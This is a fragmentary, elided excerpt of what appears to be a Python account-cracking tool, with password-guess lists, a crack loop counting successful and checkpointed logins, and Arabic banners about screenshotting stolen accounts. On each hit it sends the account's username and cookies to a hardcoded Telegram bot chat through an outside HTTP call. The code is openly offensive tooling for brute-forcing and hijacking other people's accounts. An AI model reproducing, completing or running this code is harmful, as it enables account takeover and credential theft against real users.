		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				...
				if len(frs)<3:
					...
					pwv.append('20232023')
					pwv.append('mmmmnnnn')
					pwv.append('12345678901234567890')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [𝐕𝐈𝐏] %s/%s •_• [𝗢𝗞 ] %s •_• [𝗖𝗣] %s •_• %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ')
	sys.stdout.flush()
...
|＿＿＿＿＿＿＿＿＿＿＿＿＿＿|
                     \  [^_^]   /
                       \        /
┏━━━━━━━━━━━━━━━┓
                  لاتنسى صور صيد  حتى لا يتم نشر صيدك
┗━━━━━━━━━━━━━━━┛
...
┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
❍ @k6_vk ⚜️ ¹𓆩♔𓆪ȷІ⎽ɹ̤ᒧᓄ ⚜️ @tt_beno_8 ❍  
┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
...
⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ 
				...
				if 'no' in taplikasi:
					...
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(5539618337)+"&text="+str(statusok))
					break
					...
					infoakun += f'''════════𝗢𝗞═════════
                     \ (•_•) /
┏━━━━━━━━━━━━━━━┓
                   حساب شغال الا تنسى صور الصيد حتلا لا يتم نشر صيدك            
┗━━━━━━━━━━━━━━━┛
- 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}
